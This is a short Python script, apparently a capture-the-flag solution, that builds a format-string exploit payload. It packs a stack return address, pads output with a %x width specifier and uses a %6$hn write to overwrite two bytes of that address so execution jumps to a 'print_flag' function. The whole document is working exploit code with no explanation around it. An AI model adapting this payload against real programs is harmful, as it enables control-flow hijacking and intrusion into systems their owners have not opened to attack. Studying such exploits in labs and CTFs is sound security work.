import struct

# Address to overwrite
ret_addr = 0x7fffffffd8b8
# Value to write (lower 2 bytes of print_flag)
value = 0x5269

# Pack the address
payload = struct.pack("<Q", ret_addr)
# Pad to reach the value
payload += b"%" + str(value - 8).encode() + b"x"  # -8 for the address bytes
payload += b"%6$hn"  # $hn writes 2 bytes

print(payload)